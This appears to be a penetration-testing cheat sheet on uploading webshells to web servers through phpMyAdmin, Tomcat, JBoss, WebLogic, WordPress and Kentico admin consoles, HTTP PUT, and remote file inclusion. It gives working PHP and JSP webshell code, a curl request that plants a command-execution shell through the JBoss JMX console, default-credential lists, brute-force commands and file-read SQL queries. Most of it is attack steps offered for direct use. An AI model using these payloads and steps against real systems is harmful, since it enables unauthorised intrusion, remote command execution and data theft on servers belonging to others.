# Webshell upload techniques

#### Classic Webshell upload techniques
```
Technique 1. Webshell upload using a PHPMyAdmin Web console
Technique 2. Webshell upload using an Apache Tomcat manager Web console
Technique 3. Webshell upload using a JBoss administration JMX console
Technique 4. Webshell upload using a WebLogic administration console
Technique 5. Webshell upload using a CMS Website admin console (e.g., WordPress)
Technique 6. Webshell upload by abusing the insecure HTTP PUT method
Technique 7. Webshell upload by exploiting a Website vulnerability such as:
	     - Remote File Include vulnerability
	     - Vulnerable file upload function
	     - SQL injection (e.g., MS SQL database server and xp_cmdshell)
	     - OS command execution flaw
	     - Remote Code Execution vulnerability
	     - ...
Technique 8. Webshell upload by exploing an insecure (writeable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
Technique 8. Webshell upload using a Lotus Domino admin console
Technique 9. Webshell upload using a Jenkins admin console
Technique 10. ...
```
##### Technique 1 - PHPMyAdmin Web console
```
➤ Step 1. Log into the PHPMyAdmin Web console by exploiting the presence of default or easy guessable credentials,
	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
          - URL: http://x.x.x.x/phpmyadmin or http://x.x.x.x/website-name/phpmyadmin)
          - Default or weak credentials: root:root, root and empty password
	  
➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
          - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
          - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
  
➤ Step 3. In the PHPMyAdmin Web console,  go to the SQL query browser then:
          - Type and execute the following SQL query to display OS files (it depends of the right of the account running the PHPMyAdmin console)
            + Linux server   - "SELECT LOAD_FILE('/etc/passwd');"
            + Windows server - "SELECT LOAD_FILE('C:\Windows\system.ini');"
          - Type and execute the following SQL query to write a PHP Webshell in the Web root folder
            + Linux server   - "select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/b<website-name>/wp-content/uploads/Webshell.php";"
            + Windows server - "select "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into outfile "C:\\XAMPP\\htdocs\\<website-name>\\Webshell.php";"

➤ Step 4. Access to the 'Webshell.php' file with your web browser and execute OS commands
          Examples:
          - http://x.x.x.x/<website-name>/wp-content/uploads/Webshell.php?cmd=whoami
          - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami
```

##### Technique 2 - Apache Tomcat Manager Web console
```
➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
	  - URL: http://x.x.x.x/:8080/manager/html or http://x.x.x.x/website-name/manager, ...)
	  - Default or weak credentials: tomcat:tomcat, tomcat:manager, manager:manager, admin:manager, xampp:xampp, ...
	  
➤ Step 2. Upload and deploy your WAR file 
          (i.e. "Select WAR file to upload" and then click on the "Deploy" button)

➤ Step 3. Then go to the application section to see the details about your new deployed application (e.g. path, start/stop/reload/undeploy buttons etc.)

➤ Step 4. Execute OS commands using the Webshell 
          - Examples: 
	    + http://target_IP:port/<path>/webshell.jsp?cmd=whoami
	    + http://target_IP:port/webshell/webshell.jsp?cmd=whoami
```
 
<i>Example - How to create a WAR file</i>
```
1. Choose a Web shell (.jsp)

	<%@ page import="java.util.*,java.io.*"%>
	<%
	%>
	<HTML>
	<TITLE>JSP Shell</TITLE>
	<BODY>
	Note: Against Windows you may need to prefix your command with cmd.exe /c
	</br></br>
	JSP Command:
	<FORM METHOD="GET" NAME="myform" ACTION="">
	<INPUT TYPE="text" NAME="cmd">
	<INPUT TYPE="submit" VALUE="Execute">
	</FORM>
	<PRE>
	<%
	if (request.getParameter("cmd") != null) {
	out.println("Command: " + request.getParameter("cmd") + "<BR>");
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while ( disr != null ) {
	out.println(disr);
	disr = dis.readLine();
	}
	}
	%>
	</PRE>
	</BODY>
	</HTML>

2. Generate a WAR file with the web shell : "jar -cvf webshell.war webshell.jsp"
3. Upload the WAR file to a Web server such as Tomcat, Websphere, Weblogic, JBoss etc.
```


##### Technique 3 - JBoss Administration JMX console
```
Example 1
---------
➤ Step 1. Log into the JBoss JMX console by exploiting the presence of default or easy guessable credentials,
	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
	  - Default or weak credentials: admin:admin, sysadmin:sysadmin, ...
	  - Examples of URL:
	    + https://x.x.x.x:9990/console
	    + https://x.x.x.x:8090/jmx-console/
	    + https://x.x.x.x:8080/jmx-console/
	    + https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
	    + https://x.x.x.x:8080/web-console/ServerInfo.jsp
	    + https://x.x.x.x:8080/invoker/JMXInvokerServlet
	    + https://x.x.x.x:8080/admin-console/
	    
➤ Step 2. Create a WAR file (e.g., webshell.war) with a jsp webshell and host it in a publicly available web server (python -m SimpleHTTPServer 80)
	  
➤ Step 3. On to the JMX Console, browse the URL below and type in the ObjectName filter field "*:service=MainDeployer" 
          then click on “service=MainDeployer”
	  - https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=displayMBeans

➤ Step 4. Use the “void deploy()” function to deploy a WAR file
	  - Enter the IP address of the Web server and the name of your WAR file in the URL box (in the "ParamValue" field) 
	    + example: x.x.x.x/webshell.war 
	  - Then click the “Invoke” button
	  - The web server should display the message "Operation completed successfully with a return value" 

➤ Step 5.  Execute OS commands using the Webshell 
          - Examples: 
	    + http://x.x.x.x:8080/webshell/webshell.jsp?cmd=whoami&html=true
	    + http://x.x.x.x:9090/webshell/webshell.jsp?cmd=whoami
```
```
Example 2
---------
➤ Step 1. On the command line, type the following cURL request (wrapped for better readability) to deploy a WAR file using the JMX Console:
          $ curl ’http://x.x.x.x:8080/jmx-console/HtmlAdaptor
          ?action=invokeOpByName
          &name=jboss.admin%3Aservice%3DDeploymentFileRepository
          &methodName=store
          &argType=java.lang.String
          &arg0=shell.war
          &argType=java.lang.String
          &arg1=shell
          &argType=java.lang.String
          &arg2=.jsp
          &argType=java.lang.String
          &arg3=%3C%25Runtime.getRuntime%28%29.exec%28request.
          getParameter%28%22c%22%29%29%3B%25%3E%0A
          &argType=boolean
          &arg4=True’

➤ Step 2. Afterwards, arbitrary commands can be run on the host system. 
          Examples:
          - $ curl ’http://x.x.x.x:8080/shell/shell.jsp?c=touch%20%2ftmp%2ftest.txt’
          - $ curl ’http://x.x.x.x:8080/shell/shell.jsp?c=whoami’
  
Other manual Webshell upload technique: https://securitysynapse.blogspot.com/2013/08/manually-exploiting-jboss-jmx-console.html
```

##### Technique 4 - Weblogic Administration console
```
➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
          - URL should be something like: "http:\\<Admin_server_IP>:<AdminServerPort>/console" or "https:\\x.x.x.x:7001/console", ...
          - Default or weak credentials: weblogic:weblogic, weblogic/weblogic1, weblogic/welcome1, system/Passw0rd (for Weblogic Server 11g), system/password, system/weblogic, ...
  
➤ Step 2. From the tree-structure in the left panel, choose the Web Applications node under the Deployments node. 
          Then, click on the Configure a new Web Application link in the left pane to begin the deployment of yout 'Webshell.war' application.
	  
➤ Step 3. To proceed, click on the upload it through the browser link in the right panel.
          Use the "Browse" button to locate your war file and click the "Upload" button to upload it.

➤ Step 4. At the bottom of the right panel, you will find displayed the name of the file that was just uploaded 
          i.e., your 'webshell.war' – preceded by a [select] link. This is a clear indicator of the success of the upload process. 
	  To complete the deployment however, you will have to associate the deployed war file with one or more WebLogic server instances as you deem necessary. 
          To achieve this, click on the [select] hyperlink that precedes the webshell.war entry.
	  
➤ Step 5. The Available Servers list in the right panel will list all the available WebLogic server instances. 
          From this list, choose the instances on which the egurkha application is to be deployed.
          Then, click on the –> button to transfer the selection to the Target Servers list.
          Finally, deploy the webshell application on the Target Servers by clicking on the Configure and Deploy button
	  
➤ Step 6. Once the deployment completes and is successful, the Deployment Status section in the right panel will display true against each of the target servers.
          Similarly, the Deployment Activity section will display the Completed status for each of the target servers. 
          On the contrary, if the Deployment Status is false and the Deployment Activity is “Running…”, it indicates that deployment is ‘in progress’. 
          In such a case, wait until the status changes.
	  
➤ Step 7. Execute OS commands using the Webshell 
          - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
```

##### Technique 5 - Webshell upload by abusing a CMS Website admin console protected by a weak administrator password
If you have admin privileges over a CMS such as WordPress, Kentico, DotNetNuke, Drupal, Joomla [...] then you can upload a webshell and execute OS command. 
``` 
Example 1 - WorPress
---------------------
➤ Step 1. Enumerate WordPress users or Guess the Wordpress admin's login  
          - root@kali:~/# wpscan --url http://x.x.x.x.x --enumerate p,u,t,tt)
  
➤ Step 2. Perform a bruteforce or dictionnary password attack 
          - root@kali:~/# wpscan --url http://x.x.x.x.x --wp-content-dir /wp-login.php --wordlist /root/Desktop/<path>/wordlist.dic --username admin
  
➤ Step 3. Log into the WorPress admin console 
          URL examples:
          - http://x.x.x.x/wp-login.php
          - http://x.x.x.x/wp-admin
          - http://x.x.x.x/admin
          - http://x.x.x.x/login
  
➤ Step 4. Upload of a Webshell 
          - Method 1 - Add a PHP webshell by editing a theme php page and adding the code of a PHP webshell (e.g. 404 error page)
          - Method 2 - Upload of a PHP webshell by using the WordPress plugin upload page
``` 
``` 
Example 2 - Kentico
--------------------
➤ Step 1. Log into the Kentico admin console
➤ Step 2. Edit the list file extensions allowed to add '.asp' and '.aspx'
➤ Step 3. upload a '.aspx' or '.asp' webshell using the CMS native upoad file function
``` 

##### Technique 6 - Webshell upload by abusing the insecure HTTP PUT method
```
➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
➤ Step 2. Identify the DocumentRoot directory (Web root folder)
          Examples:
          - XAMP (Windows) = "c:\XAMPP\htdocs"
          - IIS (Windows) = "C:\inetpub\wwwroot"
          - Websphere (Windows) = "c:/program files/ibm http server/htdocs" or "C:\WebSphere\IHS"
          - Apache(Linux) = '/var/www' (configuration found in the file '/etc/httpd/conf/httpd.conf' or '/etc/apache2/sites-available/default')
          - Apache(Linux) = "/var/www/html/example.com/"
          - Apache(Unix) = “/usr/local/Apache2.2/htdocs”
          - Apache(Windows) =  “C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/”
          - NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
		 
➤ Step 3. Try to upload a file with curl. 
          - curl -T test.txt http://www.sitename.com/foldername

➤ Step 4. If the file was uploaded successfully, then upload any Webshell file.
          Examples:
          - curl -T webshell.jsp http://www.sitename.com/<path>
          - curl -T webshell.asp http://www.sitename.com/<path>
          - curl -T webshell.aspx http://www.sitename.com/<path>
          - curl -T webshell.php http://www.sitename.com/<path>
 
➤ Step 5. Execute OS commands using the Webshell 
          Examples: 
          - http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
          - http://www.sitename.com/<path>/webshell.asp?cmd=whoami
          - http://www.sitename.com/<path>/webshell.php?cmd=whoami
          - ...
```

##### Technique 7 - Webshell upload by exploiting a RFI vulnerability
```
Example
➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
     	   => allow_url_fopen   : On  => potential RFI
     	   => allow_url_include : On  => potential RFI	

➤ Step 2. Create a webshell and host it on a publicly availble Web server
          Examples:
	  - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell.php
	  - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell
	  - jeff@kali:~/$ sudo python3 -m http.server 80

➤ Step 3. Find and exploit a Remote File Include (RFI) flaw using Burp proxy to execute OS commands with your webshell
          Example:
          - http://Website/index.php?p=http://x.x.x.x/webshell.php
	  - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
```